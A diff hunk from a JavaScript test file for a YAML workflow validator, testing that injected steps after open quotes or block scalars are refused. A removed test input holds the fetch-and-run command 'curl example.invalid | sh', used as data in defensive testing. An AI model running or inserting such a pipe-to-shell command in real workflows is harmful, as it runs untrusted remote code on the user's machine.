@@ -72,7 +72,7 @@ fails(keptOne.replace("|+\n\n", "|+\n"), "a kept block scalar's one blank line t
 // (a quote left open on a line the proof reads as a block scalar's text, where the header gives its indentation and
 // YAML would read it as a value that runs on to the end: every line after it is refused, never left unread; #621)
 const openQuote = "jobs:\n  a:\n    steps:\n      - run: |2\n         \"hi\n        name: x\n";
-fails(`${openQuote}      - run: curl example.invalid | sh\n`, "a step added after a quote left open in a block scalar whose header gives its indentation", "", openQuote);
+fails(`${openQuote}      - run: sh ./added.sh\n`, "a step added after a quote left open in a block scalar whose header gives its indentation", "", openQuote);
 // (the fallback reviewer's pairs on #621: a last line of spaces after a `|+` block is its text; under a header that
 // gives its indentation, a line the lexer reads as YAML is refused, never read as text the lexer parts from)
 const keptSpaces = "jobs:\n  a:\n    env:\n      FLAG: |+\n        x\n";
